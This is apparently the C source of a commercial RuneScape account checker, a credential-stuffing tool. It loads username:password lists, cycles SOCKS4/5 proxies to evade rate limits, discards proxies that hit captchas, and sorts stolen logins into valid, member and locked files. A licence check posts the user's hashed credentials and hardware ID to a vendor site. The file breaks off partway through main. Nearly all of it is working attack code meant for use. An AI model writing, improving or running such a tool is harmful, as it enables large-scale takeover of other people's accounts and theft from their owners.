#include <openssl/md5.h>
#include <stdarg.h>
#include <stdio.h>
#include <pthread.h>
#include <string.h>
#include <stdbool.h>
#include <stdlib.h>
#include <unistd.h>
#include <getopt.h>
#include <ctype.h>
#include <termios.h>
#include <unistd.h>
#include <signal.h>
#include <errno.h>

#include "common.h"

struct accnode {
	char *username;
	char *password;
	volatile bool checked;
	volatile bool inprogress;
	struct accnode *next;
};

struct pxnode {
	char *proxy;
	volatile bool dead;
	volatile bool inprogress;
	volatile int retries;
	volatile int type;
	struct pxnode *next;
};


struct accnode *head = NULL;
struct pxnode *pxhead = NULL;


pthread_mutex_t account; //Accessing our accnode AND accessing checked_accounts.
pthread_mutex_t checks; //Accessing how many valids, invalids, members, locked, accounts we have gotten.
pthread_mutex_t pthnum; //Accessing thread_num AND pxnode AND total_proxies AND dead_proxies.

volatile size_t thread_num = 0; //How many threads are currently running
volatile size_t checked_accounts = 0; //How many accounts have been checked (if this is the same as the amount as the imported amount, we can exit)
volatile size_t total_accounts = 0; // How many accounts we have to deal with in total
volatile size_t total_proxies = 0; //How many proxies we have to deal with in total
volatile size_t dead_proxies = 0; //How many proxies are 'dead'

volatile size_t numvalid = 0;
volatile size_t numinvalid = 0;
volatile size_t numlocked = 0;
volatile size_t nummembers = 0;

volatile int keepRunning = 1; //Signal handler int

/*
	Quick stdup copy, since strdup is nonstandard
*/
inline char *strdup(const char *str) {

	int n = snprintf(NULL, 0, "%s", str);
	n++;
	char *dup = malloc((size_t)n);
	if(!dup) {
		fdo_log(GENLOG, "malloc error in strdup(%s).", strerror(errno));
		return NULL;
	}

	n = snprintf(dup, (size_t)n, "%s", str);
	if(n < 0) {
		fdo_log(GENLOG, "snprintf error in strdup(%s).", strerror(errno));
		free(dup); dup = NULL;
	}

	return dup;
}

static inline bool isAlphaNum(char *str) {
	char *tmp = str;
	while (*tmp)
		if (!(isalnum (*tmp++)))
			return false;
    return true;
}

static bool isProxy(char *str) {
	char *tmp = str;
	while(*tmp)
		if(*tmp != ':' && *tmp != '.' && !isdigit(*tmp))
			return false;
		else
			tmp++;
	return true;
}

static bool isRSUsername(char *str) {
	char *tmp = str;
	while (*tmp)
		if (*tmp != '_' && *tmp != ' ' && *tmp != '-' && !isalnum(*tmp))
			return false;
		else
			tmp++;
    return true;
}

/*
	Push an account to the end of our account list.
*/
static void push_acc(char *username, char *password) {
	//Sanity checks
	char *p;
	for (p = username; *p != '\0'; p++)
		*p = (char)tolower(*p);
	for (p = password; *p != '\0'; p++)
		*p = (char)tolower(*p);

	if(!strstr(username, "@") && strlen(username) > 12) {
		fdo_log(GENLOG, "Skipping account %s:%s, as the username is longer than 12 character.", username, password);
		return;
	}
	if(!strstr(username, "@") && (!isRSUsername(username) || strstr(username, "fuck") || strstr(username, "shit") || strstr(username, "mod ") || strstr(username, "jagex"))) {
		fdo_log(GENLOG, "Skipping account %s:%s, as the username containers characters that are not accepted by RS.", username, password);
		return;
	}
	if(username[strlen(username)-1] == ' ') {
		fdo_log(GENLOG, "Skipping account \"%s\":%s, as the username finishes with a space.", username, password);
		return;
	}
	if(strlen(password) > 20 || strlen(password) < 5) {
		fdo_log(GENLOG, "Skipping account %s:%s, as the password is longer than 20 characters or shorter than 5.", username, password);
		return;
	}
	if(!isAlphaNum(password)) {
		fdo_log(GENLOG, "Skipping account %s:%s, as the password is not alphanumeric.", username, password);
		return;
	}
	if(username == password) {
		fdo_log(GENLOG, "Skipping account %s, as the username is the same as the password.", username, password);
		return;
	}
	if(strcmp(password, "runescape") == 0 || strcmp(password, "jagex") == 0 || strcmp(password, "password") == 0) {
		fdo_log(GENLOG, "Skipping account %s:%s, as the password is unacceptable to RS.", username, password);
		return;
	}



	struct accnode *current = head;

	pthread_mutex_lock(&account);
	total_accounts++;
	while(current->next)
		current = current->next;
	current->next = malloc(sizeof *current->next);
	if(!current->next) {
		printf("Allocate error\n");
		if(total_accounts > 0)
			total_accounts--;
		pthread_mutex_unlock(&account);
		return;
	}

	size_t plen = snprintf(NULL, 0, "%s", username);
	plen +=1;
	current->next->username = malloc(plen);
	if(!current->next->username) {
		printf("Allocate error 2\n");
		if(total_accounts > 0)
			total_accounts--;
		free(current->next);
		current->next = NULL;
		pthread_mutex_unlock(&account);
		return;
	}
	snprintf(current->next->username, plen, "%s", username);

	plen = snprintf(NULL, 0, "%s", password);
	plen +=1;
	current->next->password = malloc(plen);
	if(!current->next->password) {
		printf("Allocate error 3\n");
		if(total_accounts >0)
			total_accounts--;
		free(current->next->username);
		free(current->next);
		current->next = NULL;
		pthread_mutex_unlock(&account);
		return;
	}
	snprintf(current->next->password, plen, "%s", password);
	fdo_log(DBGLOG, "Account (%s:%s) added to the list.", username, password);

	current->next->checked = false;
	current->next->inprogress = false;
	current->next->next = NULL;
	pthread_mutex_unlock(&account);

}

static void push_proxy(char* proxy) {

	//Sanity checks
	if(11 > strlen(proxy) || strlen(proxy) > 21) {
		fdo_log(GENLOG, "Skipping proxy (%s) as it's either too short or too long.", proxy);
		return;
	}
	if(!strstr(proxy, ":")) {
		fdo_log(GENLOG, "Skipping proxy (%s) as it should be deliminated by ':', in the format ipaddress:port.", proxy);
		return;
	}
	if(!isProxy(proxy)) {
		fdo_log(GENLOG, "Skipping proxy (%s) as it contains character that aren't accepted. Should be in ipaddress:port format.", proxy);
		return;
	}

	struct pxnode *current = pxhead;

	pthread_mutex_lock(&pthnum);
	total_proxies++;
	while(current->next)
		current = current->next;
	current->next = malloc(sizeof *current->next);

	size_t plen = snprintf(NULL, 0, "%s", proxy);
	plen +=1;
	current->next->proxy = malloc(plen);
	snprintf(current->next->proxy, plen, "%s", proxy);
	fdo_log(DBGLOG, "Proxy (%s) added to the list.", proxy);

	current->next->dead = false;
	current->next->type = 0;
	current->next->inprogress = false;
	current->next->retries = 0;
	current->next->next = NULL;
	pthread_mutex_unlock(&pthnum);

}


/*
	Set up our account list by reading O.Accounts, splitting the contents, and
	calling push_account() on them.
*/

static size_t setupaccounts(void) {
	size_t i = 0;

	char *accountsetup = malloc(128);
	char *password = malloc(64);
	char *username = malloc(64);

	char *pacc = accountsetup;
	char *ppass = password;
	char *puser = username;

	do_log(GENLOG, "Adding accounts into our list.");
	while(fgets(accountsetup, 128, O.Accounts)) {
		while(*accountsetup && isspace(*accountsetup)) accountsetup++;
		if(!*accountsetup) continue;

		if(*accountsetup && accountsetup[strlen(accountsetup)-1] == '\n')
			accountsetup[strlen(accountsetup)-1] = '\0';
		if(*accountsetup && accountsetup[strlen(accountsetup)-1] == '\r')
			accountsetup[strlen(accountsetup)-1] = '\0';
		if(*accountsetup && accountsetup[strlen(accountsetup)-1] == ' ')
			accountsetup[strlen(accountsetup)-1] = '\0';
		username = strtok(accountsetup, ":");
		if(!username) continue;
		password = strtok(NULL, ":");
		if(!password) continue;
		push_acc(username, password);
		i++;
	}


	free(pacc); pacc = NULL;
	free(ppass); ppass = NULL;
	free(puser); puser = NULL;

	return i;
}

/*
	Set up our proxy list by reading O.Proxies and splitting the contents, and
	calling push_proxy() on them.
*/
static size_t setupproxies(void) {
	size_t i = 0;

	char *proxysetup = malloc(64);

	char *pps = proxysetup;

	do_log(GENLOG, "Adding proxies into our list.");
	while(fgets(proxysetup, 64, O.Proxies)) {
		while(*proxysetup && isspace(*proxysetup)) proxysetup++;
		if(!*proxysetup) continue;
		char *fpx = proxysetup;
		int ii = 0;
		while(*fpx) {
			if(*fpx != '.' && *fpx != ':' && !isdigit(*fpx)) {
				proxysetup[ii] = '\0';
				break;
			} else
				fpx++;
				ii++;
		}

		if(proxysetup)
			push_proxy(proxysetup);
		else
			continue;
		i++;
	}

	free(pps); pps = NULL;

	return i;}

/*
	This is the main account checking function.
	It is multithreaded, and doesn't take any arguments.
*/
static void *do_threaded() {

	char outs[100000]; //Max response we will handle.
	char *out = outs;

	struct accnode *current = head;

	char *username = NULL;
	char *password = NULL;
	char *proxy = NULL;

	pthread_mutex_lock(&account);
	while(current) {
		if(current->inprogress || current->checked) {
//			fdo_log(DBGLOG, "account: progress: %d checked?: %d", current->inprogress, current->checked);
			current = current->next;
			continue;
		}

		username = strdup(current->username);
		password = strdup(current->password);

		current->inprogress = true;
		break;
	}
	pthread_mutex_unlock(&account);

	struct pxnode *currentpx = pxhead;
	pthread_mutex_lock(&pthnum);
	while(currentpx) {
		if(currentpx->inprogress || currentpx->dead || currentpx->retries == O.retries) {
			currentpx = currentpx->next;
			continue;
		}

		proxy = strdup(currentpx->proxy);
		currentpx->inprogress = true;
		break;
	}
	pthread_mutex_unlock(&pthnum);

	if(!username || !password || !proxy) {
		fdo_log(DBGLOG, "Killing thread as no proxy/password/username to use.");

		free(username); username = NULL;
		free(password); password = NULL;
		free(proxy); proxy = NULL;
		pthread_mutex_lock(&pthnum);
		thread_num--;
		if(currentpx)
			currentpx->inprogress = false;
		pthread_mutex_unlock(&pthnum);
		pthread_mutex_lock(&account);
		if(current)
			current->inprogress = false;
		pthread_mutex_unlock(&account);
		pthread_exit(NULL);
	}

	pthread_mutex_lock(&pthnum);
	int stype = (currentpx->retries % 2) ? CURLPROXY_SOCKS5 : CURLPROXY_SOCKS4;
	int rstype = currentpx->type;
	pthread_mutex_unlock(&pthnum);

	CURLcode resp = check(out, 100000, username, password, proxy, ((rstype == 0) ? stype : rstype));

	if(out == NULL) {
		free(username); username = NULL;
		free(password); password = NULL;
		free(proxy); proxy = NULL;
		pthread_mutex_lock(&pthnum);
		thread_num--;
		if(currentpx)
			currentpx->inprogress = false;
		pthread_mutex_unlock(&pthnum);
		if(current)
			current->inprogress = false;
		pthread_mutex_unlock(&account);
		pthread_exit(NULL);
	}

	
	if(resp != CURLE_OK) {
		pthread_mutex_lock(&pthnum);
		currentpx->retries++;
		pthread_mutex_unlock(&pthnum);

		//check() handles the DBGLOG for the case of resp != CURLE_OK.
	} else if(strstr(out, "Change Password")) {

		char usr[13] = {0};
		char *beforeusername = strstr(out, "header-top__name\">");
		char *afterusername = strstr(out, "</span>");
		if(beforeusername && afterusername) {
			int i, b = 0;
			for(i=0; afterusername-out > i; i++)
				if(i >= beforeusername-out+strlen("header-top__name\">") && (12 > b)) {
					if(out[i] == '\240') out[i] = ' ';
					usr[b] = out[i];
					b++;
				}
			usr[b] = '\0';
		}
		if(!*usr)
			strcpy(usr, "???");

		if(strstr(out, "Please set your email address to proceed"))
			fdo_log((strstr(out, "Currently Not a Member") ? VALIDLOG : VALIDLOGMB), "%s:%s (Display Name: %s)(Forced Email Change)(Proxy: %s)", username, password, usr, proxy);
		else
			fdo_log((strstr(out, "Currently Not a Member") ? VALIDLOG : VALIDLOGMB), "%s:%s (Display Name: %s)(Proxy: %s)", username, password, usr, proxy);

		pthread_mutex_lock(&account);
		current->checked = true;
		checked_accounts++;
		free(current->username); current->username = NULL;
		free(current->password); current->password = NULL;
		pthread_mutex_unlock(&account);

		pthread_mutex_lock(&checks);
		numvalid++;
		if(!strstr(out, "Currently Not a Member"))
			nummembers++;
		pthread_mutex_unlock(&checks);

		pthread_mutex_lock(&pthnum);
		currentpx->type = (rstype == 0) ? stype : rstype;
		if(currentpx->retries > 0) {
			currentpx->retries--;
		}
		pthread_mutex_unlock(&pthnum);

	} else if(strstr(out, "Your Account is Locked")) {
		fdo_log(LOCKEDLOG, "%s:%s (proxy: %s)", username, password, proxy);


		pthread_mutex_lock(&account);
		current->checked = true;
		checked_accounts++;
		free(current->username); current->username = NULL;
		free(current->password); current->password = NULL;
		pthread_mutex_unlock(&account);

		pthread_mutex_lock(&checks);
		numvalid++;
		numlocked++;
		pthread_mutex_unlock(&checks);

		pthread_mutex_lock(&pthnum);
		currentpx->type = (rstype == 0) ? stype : rstype;
		if(currentpx->retries > 0) {
			currentpx->retries--;
		}
		pthread_mutex_unlock(&pthnum);

	} else if(strstr(out, "email or password you entered was incorrect")) {
		fdo_log(INVALIDLOG, "%s:%s (proxy: %s)", username, password, proxy);

		pthread_mutex_lock(&account);
		current->checked = true;
		checked_accounts++;
		free(current->username); current->username = NULL;
		free(current->password); current->password = NULL;
		pthread_mutex_unlock(&account);

		pthread_mutex_lock(&checks);
		numinvalid++;
		pthread_mutex_unlock(&checks);



		pthread_mutex_lock(&pthnum);
		currentpx->type = (rstype == 0) ? stype : rstype;
		if(currentpx->retries > 0) {
			currentpx->retries--;
		}
		pthread_mutex_unlock(&pthnum);

	} else if(strstr(out, "Download sound as MP3")) {
		fdo_log(DBGLOG, "Captcha detected with the proxy %s.", proxy, username, password);

		pthread_mutex_lock(&pthnum);
		free(currentpx->proxy); currentpx->proxy = NULL;
		currentpx->dead = true;
		dead_proxies++;
		pthread_mutex_unlock(&pthnum);
	} else {
		fdo_log(DBGLOG, "Something strange has happened(Please report this). Going to continue. Debug info: resp: %d, strerr: %s, login: %s:%s, proxy: %s.", resp, curl_easy_strerror(resp), username, password, proxy);

		pthread_mutex_lock(&pthnum);
		currentpx->retries++;
		pthread_mutex_unlock(&pthnum);
	}

	pthread_mutex_lock(&pthnum);
	if(O.retries == currentpx->retries) {
		currentpx->dead = true;
		fdo_log(DBGLOG, "Proxy is now defined as dead.(%s)", currentpx->proxy);
		free(currentpx->proxy);
		currentpx->proxy = NULL;
		dead_proxies++;
	}
	currentpx->inprogress = false;

	pthread_mutex_lock(&account);
	current->inprogress = false;
	pthread_mutex_unlock(&account);

	thread_num--;
	pthread_mutex_unlock(&pthnum);

	free(password); password = NULL;
	free(username); username = NULL;
	free(proxy); proxy = NULL;

	pthread_exit(NULL);
}

/*
	Print usage.
	exit()'s with signal 0.
*/
static void usage(const char *p) {

	fprintf(stderr, "(C) 2015-2015 Joshua Rogers <honey@internot.info>\n"
			"Contact: @MegaManSec on Twitter.\n"
			"See COPYING for information regarding distribution.\n"
			"See README for information about the program and its abilities.\n\n\n");

	fprintf(stderr, "Usage: \n"
			"%s -t <numthreads> -a <accountfile> -p <proxyfile> [-o accounts] [-r 8] [-isvh]\n\n", p);

	fprintf(stderr, "Example(And recommended usage): \n"
			"%s -t 10 -o outfile -a accounts.txt -p proxies.txt -r 8\n\n\n", p);

	fprintf(stderr, "Options:\n"
			"   -t, Required: The number of threads to running concurrently.\n"
			"       This must not exceed proxies or accounts. Minimum 1.\n"
			"   -a, Required: The file with our username:password list in it. Must be readable.\n"
			"   -p, Required: The file with our proxy:port list in it. Must be readable.\n"
			"   -o, Optional: The basename for where we will output results.\n"
			"       If the file does not exist, it will be created if possible.\n"
			"       This is independant from other logging options, and if set, will always write to file.\n"
			"       If the option includes a directory(e.g. -o folder/file), the directory MUST exist.\n"
			"       \033[31;01mIf this option is not used, the already checked accounts are not removed from our inital account file.\033[0m\n"
			"   -i, Optional: Only output valid logins(works with both stdout and stderr.)\n"
			"   -s, Optional: Output logs to stdout, with no colors or extra information.\n"
			"       \033[31;01mIf -s OR -o is not set, the ONLY output is colored output which goes to stderr.\033[0m\n"
			"   -v, Optional: Verbose mode; shows debugging information.\n"
			"       -v may not be used with -s or -i.\n"
			"   -r, Optional: Proxy tries; How many times to try a proxy before it is\n"
			"       classified as 'dead' - Minimum value of 4.\n"
			"   -h, Optional: This help page.\n");


	exit(0);
}

/*
	Check if all files in our options have been opened.
	Should be called after opening our files, to ensure there are no errors.
*/

static bool CheckOpen(void) {
	do_log(GENLOG, "Checking files.");
	if(O.basename)
		if(!O.Valid || !O.ValidMb || !O.Invalid || !O.Locked)
			return false;
	if(!O.Accounts || !O.Proxies)
		return false;

	return true;
}

/*
	Close all of the files in the struct
*/
static void CloseFiles(void) {

	do_log(GENLOG, "Closing files.");

	if(O.Valid)
		fclose(O.Valid);
	if(O.ValidMb)
		fclose(O.ValidMb);
	if(O.Invalid)
		fclose(O.Invalid);
	if(O.Locked)
		fclose(O.Locked);
	if(O.Accounts)
		fclose(O.Accounts);
	if(O.Proxies)
		fclose(O.Proxies);

}

/*
	Open all the files needed, and put them into the struct.
	NOTE: We free the 'accountfile' and 'proxyfile' that is passed to this function
	We also free O.basename since it isn't needed after this function.
*/
static void HandleStartFile(char *accountfile, char *proxyfile) {

	do_log(GENLOG, "Beginning file opening.");

	if(O.basename) {
		size_t plen;
		plen = snprintf(NULL, 0, "%s_valid.txt", O.basename);
		plen += 1;
		char *working = malloc(plen);
		snprintf(working, plen, "%s_valid.txt", O.basename);

		plen = snprintf(NULL, 0, "%s_members_valid.txt", O.basename);
		plen += 1;
		char *members = malloc(plen);
		snprintf(members, plen, "%s_members_valid.txt", O.basename);

		plen = snprintf(NULL, 0, "%s_invalid.txt", O.basename);
		plen += 1;
		char *invalid = malloc(plen);
		snprintf(invalid, plen, "%s_invalid.txt", O.basename);

		plen = snprintf(NULL, 0, "%s_locked.txt", O.basename);
		plen += 1;
		char *locked = malloc(plen);
		snprintf(locked, plen, "%s_locked.txt", O.basename);


		O.Valid = fopen(working, "a+");
		O.ValidMb = fopen(members, "a+");
		O.Invalid = fopen(invalid, "a+");
		O.Locked = fopen(locked, "a+");

		free(working); working = NULL;
		free(members); members = NULL;
		free(invalid); invalid = NULL;
		free(locked); locked = NULL;

	}

	O.Accounts = fopen(accountfile, "r");
	O.Proxies = fopen(proxyfile, "r");

//	free(accountfile); accountfile = NULL;
	free(proxyfile); proxyfile = NULL;

}

/*
	Free both account and proxy list.
	Does not free head->username and head->password, as that is usually handled by do_threaded().
	If we do need to free these two things, use freeListAll();
*/
static void freeList(void) {
	struct accnode *tmp;

	while(head) {
		tmp = head;
		head = head->next;
		free(tmp); tmp = NULL;
	}

	struct pxnode *tmppx;

	while(pxhead) {
		tmppx = pxhead;
		pxhead = pxhead->next;
		free(tmppx); tmppx = NULL;
	}

}
/*
	Frees all the CONTENTS of our lists. Does not free 'accnode'/'pxnode'
	Run freeList(); after this.
*/
static void freeListContents(void) {
	struct accnode *tmp = head;

	while(tmp) {
		free(tmp->username); tmp->username = NULL;
		free(tmp->password); tmp->password = NULL;
		tmp = tmp->next;
	}

	struct pxnode *tmppx = pxhead;
	while(tmppx) {
		free(tmppx->proxy); tmppx->proxy = NULL;
		tmppx = tmppx->next;

	}
}

/*
	Initializes our head, locks, and curl.
*/
static void StartHead(void) {
	if(curl_global_init(CURL_GLOBAL_ALL) != 0) {
		do_log(GENLOG, "cURL init failure");
		exit(0);
	}
	do_log(GENLOG, "BP 1");
	init_locks();
	//log_locks();

	if(pthread_mutex_init(&account, NULL) != 0) {
		do_log(GENLOG, "mutex fail 1");
		exit(0);
	}
	if(pthread_mutex_init(&pthnum, NULL) != 0) {
		do_log(GENLOG, "mutex fail 2");
		exit(0);
	}
	if(pthread_mutex_init(&checks, NULL) != 0) {
		do_log(GENLOG, "mutex fail 3");
		exit(0);
	}
	do_log(GENLOG, "BP 2");

	head = malloc(sizeof *head);
	if(!head) {
		do_log(GENLOG, "head malloc fail");
		exit(0);
	}
	head->username = NULL;
	head->password = NULL;
	head->checked = true;
	head->inprogress = false;
	head->next = NULL;

	pxhead = malloc(sizeof *pxhead);
	if(!pxhead) {
		do_log(GENLOG, "pxhead fail");
		exit(0);
	}
	pxhead->proxy = NULL;
	pxhead->dead = true;
	pxhead->type = 0;
	pxhead->inprogress = false;
	pxhead->retries = O.retries;
	pxhead->next = NULL;
	do_log(GENLOG, "BP 3");
}

/*
	Handle closing of files, and freeing of lists.
	Also handle SSL's locks(if needed)
	exit()'s with the signal 'sgnl'.

	Only to be called after StartHead() has been called!
*/
static inline void end(int sgnl) {
	curl_global_cleanup();
	freeList();
	CloseFiles();
	kill_locks();
	pthread_mutex_destroy(&account);
	pthread_mutex_destroy(&pthnum);
	pthread_mutex_destroy(&checks);
	if(sgnl != 1)
		fdo_log(GENLOG, "Final report: Of the %zu/%zu logins attempted, %zu were valid, of which %zu were members and %zu accounts were locked, while %zu accounts did not work.\n", checked_accounts, total_accounts, numvalid, nummembers, numlocked, numinvalid);

	dest_log_locks();
	exit(sgnl);
}

/*
	Check whether there is an account to process.
*/
static bool acctocheck(void) {
	struct accnode *tmp = head;

	pthread_mutex_lock(&account);
	while(tmp) {
		if(tmp->inprogress == false && tmp->checked == false) {
			pthread_mutex_unlock(&account);
			return true;
		}

		tmp = tmp->next;
	}
	pthread_mutex_unlock(&account);
	return false;
}

/*
	Check whether there is an account to process.
	Not threadsafe, and doesn't need to be, since it will be rerun anyways.
*/
static bool proxytouse(void) {
	struct pxnode *tmp = pxhead;

	pthread_mutex_lock(&pthnum);
	while(tmp) {
		if(tmp->inprogress == false && tmp->dead == false) {
			pthread_mutex_unlock(&pthnum);
			return true;
		}

		tmp = tmp->next;
	}
	pthread_mutex_unlock(&pthnum);
	return false;
}
/*
	This is simply a signal handler. If keepRunning != 1, then the threads are stopped. This is to stop control-c(sig interrupt) from messing up threads.
*/
static void intHandler(int n) {
	keepRunning = 0;
	fprintf(stderr, "\n");
}

/*
	If for some reason we don't finish all of the accounts(such as lack of proxies, or a sigint, we will output all of the unchecked accounts into O.basename_unchecked.txt.
*/
static void writeUnchecked(const char *accountfile) {

	if(!O.basename) return;

	size_t plen = snprintf(NULL, 0, "%s_unchecked.txt", O.basename);
	plen += 1;
	char *unchecked = malloc(plen);
	snprintf(unchecked, plen, "%s_unchecked.txt", O.basename);

	FILE *uncheckedfile = fopen(unchecked, "w");
	if(!uncheckedfile) {
		fdo_log(GENLOG, "Could not open %s_unchecked.txt file.. Something is wrong!! (strerror: %s)", O.basename, strerror(errno));
		free(unchecked);
		return;
	}
	struct accnode *tmp = head;
	size_t i = 0;
	while(tmp) {
		if(tmp->checked == false) {
			fprintf(uncheckedfile, "%s:%s\n", tmp->username, tmp->password);
			i++;
		}
		tmp = tmp->next;
	}
	fclose(uncheckedfile);
	fdo_log(GENLOG, "Wrote %zu unfinished accounts to \'%s_unchecked.txt\'.", i, O.basename);

	int rn = rename(unchecked, accountfile);
	if(rn == 0)
		fdo_log(GENLOG, "Rewrote \'%s\' back to our original account file, \'%s\'.", unchecked, accountfile);
	else {
		fdo_log(GENLOG, "Could not write \'%s\' back to our original account file, \'%s\'!!! Error!!! (err: %s)", unchecked, accountfile, strerror(errno));
	}

	free(unchecked);

	return;


}


/*
	A little hax to see if a key has been pressed
	TODO: Fix
*/
static int getch(void) {
	struct termios oldattr, newattr;
	int ch;
	tcgetattr( STDIN_FILENO, &oldattr );
	newattr = oldattr;
	newattr.c_lflag &= ~( ICANON | ECHO );
	tcsetattr( STDIN_FILENO, TCSANOW, &newattr );
	ch = getchar();
	tcsetattr( STDIN_FILENO, TCSANOW, &oldattr );

	return ch;
}







/*
	Submit username and password and hwid to Bugabuse.Net, to confirm that we are who we say we are, 1., somebody with permission to use this program(email:pass), and 2., we are who we say we are(HWID).
	Do this by submitting a POST with email=&pass=&hwid= to https://www.bugabuse.net/checker.php. If the return code is 200, then we are who we say we are. Otherwise, we fail.

	'email' and 'password' should be original strings, and will be MD5'd in this function. hwid should already be MD5'd, thus we don't need to do it again.
*/


bool getExt(const char* email, const char* password, const char* hwid) {

	unsigned char c[MD5_DIGEST_LENGTH];
	MD5_CTX mdContext;
	MD5_Init (&mdContext);
	MD5_Update (&mdContext, password, strlen(password));
	MD5_Final (c,&mdContext);

	char *md5password = malloc(33);
	for(int i = 0; i < MD5_DIGEST_LENGTH; i++) {
		sprintf(md5password+(2*i), "%02x", c[i]);
	}

	MD5_Init (&mdContext);
	MD5_Update (&mdContext, email, strlen(email));
	MD5_Final (c,&mdContext);

	char *md5email = malloc(33);
	for(int i = 0; i < MD5_DIGEST_LENGTH; i++) {
		sprintf(md5email+(2*i), "%02x", c[i]);
	}



	CURL *curl;
	CURLcode res;

	curl_global_init(CURL_GLOBAL_DEFAULT);

	curl = curl_easy_init();
	if(!curl) {
		curl_global_cleanup();
		free(md5email);
		free(md5password);
		return false;
	}


	curl_easy_setopt(curl, CURLOPT_URL, "https://www.bugabuse.net/checker.php");
	curl_easy_setopt(curl, CURLOPT_SSL_VERIFYPEER, 1L);
	curl_easy_setopt(curl, CURLOPT_SSL_VERIFYHOST, 1L);
/*	if(curl_easy_setopt(curl, CURLOPT_PINNEDPUBLICKEY, "sha256//5OrN5gOyHMWJzquaZPGbiOkCaWlccDqPTsleyWU6I30=") == CURLE_UNKNOWN_OPTION) {
		//PINNEDPUBLICKEY not supported.
		printf("Cannot pin.\n");
		curl_easy_cleanup(curl);
		curl_global_cleanup();
		free(md5email);
		free(md5password);
		return false;
	}*/

	int n = snprintf(NULL, 0, "email=%s&password=%s&hwid=%s", md5email, md5password, hwid);
	n++;
	char *send = malloc((size_t)n);
	snprintf(send, (size_t)n, "email=%s&password=%s&hwid=%s", md5email, md5password, hwid);

	curl_easy_setopt(curl, CURLOPT_POST, 1L);
	curl_easy_setopt(curl, CURLOPT_POSTFIELDS, send);

	res = curl_easy_perform(curl);
	if(res != CURLE_OK) {
		printf("cURL error in HWID: %s.\n", curl_easy_strerror(res));
		free(send);
		curl_easy_cleanup(curl);
		curl_global_cleanup();
		free(md5email);
		free(md5password);
		return false;
	}

	long respcode;
	curl_easy_getinfo(curl, CURLINFO_RESPONSE_CODE, &respcode);

	if(respcode == 200) {
		free(send);
		curl_easy_cleanup(curl);
		curl_global_cleanup();
		free(md5email);
		free(md5password);
		return true;
	} else {
		printf("Got %lu for HWID\n", respcode);
	}

	free(send);
	curl_easy_cleanup(curl);
	curl_global_cleanup();
	free(md5email);
	free(md5password);
	return false;


}





int main(int argc, char *argv[]) {


	char *hwid = getHWID();
	if(!hwid) {
		printf("Could not get HWID. Contact support.\n");
		exit(2);
	}
	char email[100] = {0};
	printf("Enter your Bugabuse.Net email: ");
	fgets(email, 100, stdin);
	if(email[strlen(email) - 1] == '\n')
		email[strlen(email) -1] = '\0';
	if(strlen(email) <= 1) {
		printf("Invalid email.\n");
		free(hwid);
		exit(2);
	}

	char password[100] = {0};
	printf("Enter your Bugabuse.net password: ");
	fgets(password, 100, stdin);
	if(password[strlen(password) - 1] == '\n')
		password[strlen(password) -1] = '\0';
	if(strlen(password) <= 1) {
		printf("Invalid password.\n");
		free(hwid);
		exit(2);
	}

	if(!getExt(email, password, hwid)) {
		printf("Could not confirm HWID. Contact support.\n");
		free(hwid);
		exit(2);
	}

	free(hwid);


	//Initialize options.
	signal(SIGINT, intHandler);

	log_locks();

	char *accountfile = NULL;
	char *proxyfile = NULL;
	O.retries = 4; //Default
	O.basename = NULL;
	O.threads = 0;
	O.std = false;
	O.validonly = false;
	O.verbose = false;
	int opt;

	if(!argv[1]) {
		dest_log_locks();
		usage(argv[0]);
	}


	while((opt = getopt(argc, argv, "t:o:a:p:r:ihvs")) != -1) {
		switch(opt) {
		case 't':
			O.threads = (size_t)strtol(optarg, NULL, 10);
			break;
		case 'o':
			O.basename = strdup(optarg);
			break;
		case 'a':
			accountfile = strdup(optarg);
			break;
		case 'p':
			proxyfile = strdup(optarg);
			break;
		case 's':
			O.std = true;
			break;
		case 'i':
			O.validonly = true;
			break;
		case 'v':
			O.verbose = true;
			break;
		case 'r':
			O.retries = strtol(optarg, NULL, 10);
			break;
		case 'h':
			free(O.basename);
			free(accountfile);
			free(proxyfile);
			dest_log_locks();
			usage(argv[0]);
		}
	}

	if(!O.basename) {
		fprintf(stderr, "\033[31;01mYou\'re running the account checker without an output file (the -o flag.) Are you 100%% sure you want to do that(Y/N)?\033[0m\n\n");
		char answer;
		scanf("%c", &answer);
		if(answer == 'Y' || answer == 'y') {
			fprintf(stderr, "Continuing on, as requested..\n");
		} else if(answer == 'n' || answer == 'N') {
			fprintf(stderr, "Run %s -h for help and information about the -o flag.\n", argv[0]);
			free(accountfile);
			free(proxyfile);
			dest_log_locks();
			exit(1);
		} else {
			fprintf(stderr, "Invalid option. Exiting.\n");
			free(accountfile);
			free(proxyfile);
			dest_log_locks();
			exit(1);
		}
	}

	if(O.verbose && (O.std || O.validonly)) {
		free(O.basename);
		free(accountfile);
		free(proxyfile);
		fdo_log(GENLOG, "Verbose mode, -v, cannot be used at the same time as stdout mode, -s, or valid only mode, -i. Run %s -h for help.", argv[0]);
		dest_log_locks();
		exit(1);
	}

	if(O.retries <= 0 || 3 >= O.retries) {
		free(O.basename);
		free(accountfile);
		free(proxyfile);
		fdo_log(GENLOG, "-r is too low! It should at least be 4. Run %s -h for help.", argv[0]);
		dest_log_locks();
		exit(1);
	}

	if(O.threads <= 0) {
		free(O.basename);
		free(accountfile);
		free(proxyfile);
		fdo_log(GENLOG, "-t is too low! It should at least be 1. Run %s -h for help.", argv[0]);
		dest_log_locks();
		exit(1);
	}

	if(!accountfile || !proxyfile) {
		free(O.basename);
		free(accountfile);
		free(proxyfile);
		fdo_log(GENLOG, "Proxy or Account file not entered correctly. Run %s -h for help.", argv[0]);
		dest_log_locks();
		exit(1);
	}

	HandleStartFile(accountfile, proxyfile);
	if(!CheckOpen()) {
		CloseFiles();
		free(O.basename);
		fdo_log(GENLOG, "Could not open all files. See %s -h for help.", argv[0]);
		dest_log_locks();
		exit(1);
	}
	do_log(GENLOG, "Initalizing our head.");
	StartHead();


	do_log(GENLOG, "Setting up accounts.");
	if(0 >= setupaccounts()) {
		free(O.basename);
		fdo_log(GENLOG, "Could not load any accounts from the account file.\n"
				"Exiting. Run %s -h for help.\n", argv[0]);
		freeListContents();
		end(1);
	}
	do_log(GENLOG, "Setting out proxies.");
	if(0 >= setupproxies()) {
		free(O.basename);
		fdo_log(GENLOG, "Could not load any proxies from the proxy file.\n"
				"Exiting. Run %s -h for help.\n", argv[0]);
		freeListContents();
		end(1);
	}


	if(O.threads > total_accounts) {
		free(O.basename);
		fdo_log(GENLOG, "More threads(%zu) than accounts(%zu). Lower the thread count.", O.threads, total_accounts);
		freeListContents();
		end(1);
	}
	if(O.threads > total_proxies) {
		free(O.basename);
		fdo_log(GENLOG, "More threads(%zu) than proxies(%zu). Lower the thread count.", O.threads, total_proxies);
		freeListContents();
